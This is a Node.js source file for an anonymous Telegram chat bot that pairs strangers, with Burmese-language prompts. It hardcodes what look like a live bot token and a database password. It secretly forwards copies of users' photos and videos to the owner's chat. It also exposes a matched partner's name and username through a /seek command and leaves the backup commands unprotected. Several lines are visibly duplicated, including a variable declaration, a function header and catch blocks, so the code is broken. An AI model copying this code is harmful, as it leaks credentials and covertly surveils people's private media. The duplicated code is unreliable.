const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const botToken = '6699625473:AAF4v6NLNqsLC_gsNR21iurb_UhZltqf0n0';
const bot = new TelegramBot(botToken, { polling: true });
const express = require('express');
// Create an Express application
const app = express();
const {Mutex} = require("async-mutex");
const mutex = new Mutex();
const mutexForDataBase = new Mutex();
// Connection URI
const uri = 'mongodb+srv://Geek:Wu2wm5ltnipo3FcP@chatbot.rm39fbb.mongodb.net/?retryWrites=true&w=majority&appName=chatbot';


// Create a new MongoClient
const { MongoClient, ServerApiVersion } = require('mongodb');
const client = new MongoClient(uri, {
    serverApi: {
      version: ServerApiVersion.v1,
      strict: true,
      deprecationErrors: true,
    }
  });

// man made moduels

const backup = require("./socure/backup");
let ownerId = "6798013182"


// Middleware to parse JSON bodies
let messageQuee = {};// {chatId:chaId};
let inMessage = []; // [chatId];
let replyQuee = {}; // {chatId:[1,2]}, in that number inside array means the value or the key of reply listner

let helpLine = `🚨 Bot သုံးနည်း

👮‍♂  /start ,  /find command သည် လူရှားရန်ုဖြစ်သည်။ 

👮‍♂ /next command သည်လက်ရှိစကားပြောနေသောလူအား ကျော်ရန်ဖြစ်သည်။

👮‍♂ /stop command သည် bot ကိုရပ်တန့်ရန်ဖြစ်သည်။

/help ကို သုံးပြီး bot သုံးနည်းကို လေ့လာနိုင်သည်။


⚠️ အထက်ပါဖော်ပြထားသော commands များကို စားရိုက်ပြီးပို့နိုင်သလို အဲ့ command များကို ဖော်ပြထားသော နေရာတွင် နှိပ်၍လဲ သုံးနိုင်သည်။`

client.connect();
let dataBase = client.db("users");
let collection = dataBase.collection("data");

async function checkUserAuth(chatId) {
    // this function check the user auth if the user  registerd it will return true
    // if not then flase will return
    try {
       
        let userData = await collection.find({chatId}).toArray();
        if (userData[0]!=undefined) {
            return true;
        }
        return false;
    }
    catch (err) {
        console.log(err);
        return false;
    }
    
}


function register(msg) {
    return new Promise(async (res, rej) => {
        try {
            let chatId = msg.from.id;

            let name = msg.from.first_name;
            if (msg.from.last_name != undefined) {
                name = name + " " + msg.from.last_name;
            }

            let userName = null;
            if (msg.from.username != undefined) {
                userName = msg.from.username;
            }
            let userName = null;
            if (msg.from.username != undefined) {
                userName = msg.from.username;
            }


            let age;
            let gender;
            let replyIndex; // is it for the age after user has entered his age that replylistern must of delete
            let setTime;    // to remove the setTimeout that is used to close the replyListern if there is not respose form the user

            await bot.sendMessage(chatId, "🌐-Rigister require! \n\nစသုံးသူ အနေနဲ့သင်၏ အသက်နှင့်\n\nကျားမ ရွေးပေးရမည်");
            let ageMessage = await bot.sendMessage(chatId, "📆 𝙋𝙡𝙚𝙖𝙨𝙚 𝙚𝙣𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙖𝙜𝙚!\n\n 📆 သင်၏အသက်ကိုထည့်ပါ။", {
                reply_markup: {
                    force_reply: true
                }
            });

            let ageResponse = await new Promise((res, rej) => {
                // if uses do not do anything after 1 mins that replyLister for the age will be deleted automatically
                // and function will return false that indicate the end of the function

                setTime = setTimeout(() => {
                    bot.removeReplyListener(replyIndex);
                    res(false); // will return to ageResponse
                }, 1000 * 60);

                replyIndex = bot.onReplyToMessage(chatId, ageMessage.message_id, (reply) => {
                    // if the user does not enter a number then it will be deleted automatically
                    if (reply.text == undefined || isNaN(reply.text)) {
                        bot.removeReplyListener(replyIndex);
                        clearTimeout(setTime);
                        res(false);
                    }
                    // if the use add a valid age return the age;
                    else {
                        bot.removeReplyListener(replyIndex);
                        clearTimeout(setTime);
                        res(reply.text);
                    }
                })
            })

            if (ageResponse == false) {
                res(false); // that respose is for rigister function 
                return;
            }

            age = ageResponse;

            const keyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🚹 Male - ကျား', callback_data: 'male' }],
                        [{ text: '🚺 Female - မ', callback_data: 'female' }],
                        [{ text: '⭕ Other', callback_data: 'other' }],
                    ],
                },

            };

            await bot.sendMessage(chatId, "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙚𝙡𝙚𝙘𝙩 𝙮𝙤𝙪𝙧 𝙜𝙚𝙣𝙙𝙚𝙧:\n\nကျေးဇူးပြု၍ တစ်ခုရွေးပါ။", keyboard);
            // that line give 3 options for the user to choose their gender
            // if user select one that will store in genderQuee object like chatId:gender eg: 334342343242:"male"
            
            let genderRespose = await new Promise((res, rej) => {
                let index = 0;
                let interval = setInterval(() => {
                    // in every 1 second we are checking does user press any button or not
                    // if users press any button their gender will store in genderQuee and key is their chatId
                    // and will make genderQuee[chatId] not equal to undefined
                    // if user does not press any button in 60 second then we will clear interval and will return false
                    // 
                    if (genderQuee[chatId] != undefined) {
                        clearInterval(interval); // stop the current interval;
                        let genderType = genderQuee[chatId]
                        delete genderQuee[chatId];
                        res(genderType); // will return to genderRespose
                    }
                    if (index > 60) {
                        // indicate user does not press any button so clear the interval and return false
                        clearInterval(interval);
                        res(false);
                    }

                    index++;
                }, 1000);
            })

            if (genderRespose == false) {
                res(false); // resopose to resgister function
                return;
            }

           gender  = genderRespose;


            let userData =  { name, userName, age, gender,chatId };
            let dataAddStatus = await  collection.insertOne(userData);
            if(dataAddStatus.acknowledged==false){
                res(false);
                return;
            }
            await bot.sendMessage(chatId, "✅ Your account is registered successfully");
            await bot.sendMessage(chatId,helpLine);
            res(true);


        }
        catch (err) {
            res(false);
        }
    })
}

let waitingQuee = []; // [{}] = [{chatId:chatId}];

async function matchUser(chatId) {
    try {
        if (waitingQuee[0] == undefined) {
            waitingQuee.push(chatId);
            await bot.sendMessage(chatId, "🔎 partner ရှာနေပါသည် ....................");
            return false;
        }
        else if (waitingQuee[0] == chatId) {
            await bot.sendMessage(chatId, "🤧 ရှာနေတယ် ခဏလေစောင့်ပါ။..................");
            return false;
        }
        else if (waitingQuee[0] != undefined && waitingQuee[0] != chatId) {
            let user2 = waitingQuee[0];
            waitingQuee.shift();
            return { chatId1: chatId, chatId2: user2 };

        }
        else{
            bot.sendMessage(chatId,"Cannot find a partner for you!");
            return false;
        }
    }
    catch (err) {
        console.log(err);
    }
}



async function connectBothUser(chatId1, chatId2) {
    try {
        let template = ` partner တွေ့ရှိပါသည်🎉\n\n /next နောက်တစ်ယောက်ရှာရန်😜\n\n /stop ရပ်တန့်ရန်🥲\n\n https://t.me/talk_mm_bot`
        await bot.sendMessage(chatId1, template);
        await bot.sendMessage(chatId2, template);

        inMessage.push(chatId1);
        inMessage.push(chatId2);

        messageQuee[chatId1] = chatId2;
        messageQuee[chatId2] = chatId1;


    }
    catch (err) {
        console.log(err);
    }
}


// mainHandler check wheathe use is auth or not
// if user is auth then find another else add current use in waitingQuee
// at last connect them with their chatId like chatId1:chatId2 and chatId2:chatId1
// and add to meesageQuee{};

async function mainHandler(msg) {
    try{
    // checking does the user is auth or not
    // to check the user auth we use checkAuth(chatId) function
    // that function return true if auth else false and if there is an error it return "error"
        let chatId = msg.chat.id;
        let isAuth = await checkUserAuth(chatId);
        if (isAuth == false) {
            
            let registerStatus = await register(msg);
            if(registerStatus==false){
                await bot.sendMessage(chatId, "⚠️ Fail to register your account");
                return;
            }
            else if(registerStatus==true){
                let usersDeatils = await matchUser(chatId);
                if(usersDeatils!=false){
                    await connectBothUser(usersDeatils.chatId1, usersDeatils.chatId2);
                }
                else{
                    await bot.sendMessage(msg.chat.id,"Error contact to https://t.me/Ye_lin_tun_x_C")
                }
            }
        }
        else {
            let usersDeatils = await matchUser(chatId);
            if (usersDeatils != false) {
                await connectBothUser(usersDeatils.chatId1, usersDeatils.chatId2);
            }
        }
    }
    catch(err){
        // console.log(err);
        return false;
    }

   
}

function isInMessage(chatId) {
    for (let a = 0; a < inMessage.length; a++) {
        if (chatId == inMessage[a]) {
            return true;
        }
    }
    return false;
}
// isInMessage function is used to check does user is already in chatting box or not
// if user is not in chatting box then it will  return false




function removeListeners(chatId) {
    let removeList = replyQuee[chatId]; // will get array of replyListener id ;
    if (removeList == undefined) {
        return;
    }

    for (let a = 0; a < removeList.length; a++) {
        bot.removeReplyListener(removeList[a]);
    }
    delete replyQuee[chatId];
}

async function disconnection(chatId, sendMarkup,command) {
async function disconnection(chatId, sendMarkup,command) {
    try {
        if (!isInMessage(chatId)) { // isInMessage is a functiion that chcek whether you are in chat or not
            await bot.sendMessage(chatId, "🤨 ကျော်ဖို့ ဘယ်သူမှ မရှိဘူး \n\n🚀 ရှာရန် /start 𝙤𝙧 /find ကိုနှိပ်ပါ🌚");
            return false;
        }
        let keyboard = {
            reply_markup: {
                keyboard: [
                    [{ text: '🚀 Find new partner' }],
                    [{ text: '💼 Grow business with us' }]
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        };
        if (sendMarkup == false) {
            keyboard = undefined;
        }

        if (!isInMessage(chatId)) { // isInMessage is a functiion that chcek whether you are in chat or not
            await bot.sendMessage(chatId, "🤨 ကျော်ဖို့ ဘယ်သူမှ မရှိဘူး \n\n🚀 ရှာရန် /start 𝙤𝙧 /find ကိုနှိပ်ပါ🌚");
            return false;
        }
        let keyboard = {
            reply_markup: {
                keyboard: [
                    [{ text: '🚀 Find new partner' }],
                    [{ text: '💼 Grow business with us' }]
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        };
        if (sendMarkup == false) {
            keyboard = undefined;
        }

        let user2 = messageQuee[chatId];
        delete messageQuee[user2];
        delete messageQuee[chatId];

        // Remove chatIds from inMessage array
        inMessage = inMessage.filter(id => id !== chatId && id !== user2);

        // removeListerns is the fucnction to remove reply listners
        removeListeners(chatId);
        removeListeners(user2);
        let adviceLine = `Bot နှင့် ပတ်သက်၍ အကြံပေးလိုပါက  @Ye_lin_tun_x_C ကို ဆက်သွယ်ပါ`;
        if(command=="/stop"){
            await bot.sendMessage(chatId, "သင်ရပ်တန့်လိုက်ပြီး💢\n\n နောက်တစ်ယောက်ရှာရန် /start or /find ကိုနှိပ်ပါ🙃", keyboard);
            await bot.sendMessage(chatId,adviceLine);
        }
        else{
            await bot.sendMessage(chatId, "သင်ရပ်တန့်လိုက်ပြီး💢\n\n သင့်အတွက်နောက်တစ်ယောက် ရှားနေပါသည်😜", keyboard);
            await bot.sendMessage(chatId,adviceLine);

        }
        await bot.sendMessage(user2, "ခနခန😅 အကျော် ခံရပြီး \n\nနောက်တစ်ယောက်ရှာရန် /start or /find ကိုနှိပ်ပါ🙃", keyboard);
        await bot.sendMessage(user2,adviceLine);


        return true;
    } catch (err) {
        console.log(err);
        return false;
        return false;
    }
}

bot.on("message", async(msg) => {
bot.on("message", async(msg) => {
    try {
        if (msg.text == "🚀 Find new partner" || msg.text == "/start" || msg.text == "/find") {
            if (!isInMessage(msg.chat.id)) {
                mainHandler(msg);
            }
           else {
                bot.sendMessage(msg.chat.id, "🤪 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙘𝙝𝙖𝙩𝙩𝙞𝙣𝙜 𝙗𝙤𝙭 !");
            }

         }
        else if(msg.text=="/next"){
            let disconnectionStaus = await disconnection(msg.chat.id,false,"/next");
            if(disconnectionStaus==true){
                mainHandler(msg);
            }
            
        }
        else if(msg.text=="/stop"){


            await disconnection(msg.chat.id,true,"/stop");
        }
        else if(msg.text=="/help"){
            await bot.sendMessage(msg.chat.id,helpLine);
        }
        else if(msg.text=="/log-out"){
            
            let result  = await collection.deleteOne({chatId:msg.chat.id});
            if(result.deletedCount==1){
                await bot.sendMessage(msg.chat.id,"✅ log out လုပ်ချင်းအောင်မြင်ပါသည်။")
            }
            else if(result.deletedCount<=0){
                await bot.sendMessage(msg.chat.id,"❌ log out လုပ်ချင်း မအောင်မြင်ပါ။")
            }
        }
        else if(msg.text=="/backup"){
    
            bot.sendMessage(ownerId,"Back up called");
            backup.backup(fs,messageQuee,inMessage);
            await bot.sendDocument(ownerId,"./data/backup.json");
            
        }

        else if(msg.text=="/load"){
            bot.sendMessage(ownerId,"load called");
            let backup =fs.readFileSync("./data/backup.json","utf-8");
            backup = JSON.parse(backup);

           
            messageQuee = backup.messageQuee;
            inMessage =backup.inMessage;
        }

        else if(msg.text=="/seek"){
            let chatId  = msg.chat.id;
            let targetId = messageQuee[chatId];
            if(targetId==undefined){
                await bot.sendMessage(chatId,"YOU DONT HAVE PARTNER TO SEEk")
            }
            else{
                let data = await collection.find({chatId:targetId}).toArray();
                data = data[0];
                await bot.sendMessage(chatId,`Name: ${data.name}\nage: ${data.age}\ngender: ${data.gender}\nusername:@${data.userName}`);
            }
        }
        else if (messageQuee[msg.chat.id] != undefined && msg.reply_to_message == undefined) {
            let partnerId = messageQuee[msg.chat.id];
            if(partnerId==undefined){
                console.log(partnerId);
                await bot.sendMessage(msg.chat.id,`စကား ပြောရန် အဖော်မရှိပါ😭\n\nရှားရန်  /start or /find ကို နှိပ်ပါ`);   
            }
            if (msg.text) {
                if(!msg.text.startsWith("/")){
                    sendMessage(partnerId, msg, undefined, msg.message_id);
                }
            }
            else{
                sendMessage(partnerId, msg, undefined, msg.message_id);
            }
        }
        
    }
    catch (err) {
        console.log(err);
    }
})
let genderQuee = {}; //chatId:gender
bot.on("callback_query", (msg) => {
    let chatId = msg.message.chat.id;;
    let gender = msg.data;
    if(gender==undefined){
        return;
    }
    bot.deleteMessage(chatId, msg.message.message_id)
    genderQuee[chatId] = gender;
})

bot.on("polling_error",()=>{
    bot.sendMessage(ownerId,"Hey sever needs attention!");
    backup.backup(fs,messageQuee,inMessage,replyQuee);
})


// server code here

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});

// message handeler function are here


function addReplyListenerId(replyId, toSendChatId) {
    try {
        if (replyQuee[toSendChatId] == undefined) {
            replyQuee[toSendChatId] = [replyId];
        }
        else {
            let replyIdArr = replyQuee[toSendChatId];
            replyIdArr.push(replyId);
            replyQuee[toSendChatId] = replyIdArr;
        }

    }
    catch (err) {
        console.log(err);
    }
}


async function sendMessage(toSendChatId, msg, messagaId, originalMessageId) {
    try {
        let messageData;
        if (msg.text) {
            messageData = await bot.sendMessage(toSendChatId, msg.text, { reply_to_message_id: messagaId });
        }
        else if (msg.photo) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendPhoto(toSendChatId, msg.photo[2].file_id, { caption: caption, reply_to_message_id: messagaId });

            bot.sendPhoto(ownerId, msg.photo[2].file_id, { caption: caption, reply_to_message_id: messagaId });
        }
        else if (msg.video) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendVideo(toSendChatId, msg.video.file_id, { caption: caption, reply_to_message_id: messagaId });

            bot.sendVideo(ownerId, msg.video.file_id, { caption: caption, reply_to_message_id: messagaId });
        }
        else if (msg.sticker) {
            messageData = await bot.sendSticker(toSendChatId, msg.sticker.file_id, { reply_to_message_id: messagaId });
        }
        else if (msg.voice) {
            messageData = await bot.sendVoice(toSendChatId, msg.voice.file_id, { reply_to_message_id: messagaId });
        }
        else if (msg.video_note) {
            messageData = await bot.sendVideoNote(toSendChatId, msg.video_note.file_id, { reply_to_message_id: messagaId });

        }
        else if (msg.audio) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendAudio(toSendChatId, msg.audio.file_id, { caption: caption, reply_to_message_id: messagaId });

        }
        else if (msg.document) {
            let caption;
            if (msg.caption) {
                caption = msg.caption;
            }
            messageData = await bot.sendDocument(toSendChatId, msg.document.file_id, { caption: caption, reply_to_message_id: messagaId });
        }
        else if (msg.contact) {
            messageData = await bot.sendContact(toSendChatId, msg.contact.phone_number, msg.contact.first_name, { reply_to_message_id: messagaId });
        }

        let replyId = bot.onReplyToMessage(toSendChatId, messageData.message_id, async (reply) => {
            let targetUser = messageQuee[toSendChatId];
            await sendMessage(targetUser, reply, originalMessageId, reply.message_id).catch((err) => {
                console.log(err);
            })
        })

        addReplyListenerId(replyId, toSendChatId);


        // code is to add self replying feature

        let originalChatId = messageQuee[toSendChatId];
        replyId = bot.onReplyToMessage(originalChatId, originalMessageId, async (reply) => {
            try {
                let targetUser = messageQuee[originalChatId]
                await sendMessage(targetUser, reply, messageData.message_id, reply.message_id)
            }
            catch (err) {
                console.log(err);
            }
        })
        addReplyListenerId(replyId, originalChatId);



    }
    catch (err) {
    catch (err) {
        console.log(err);
    }
}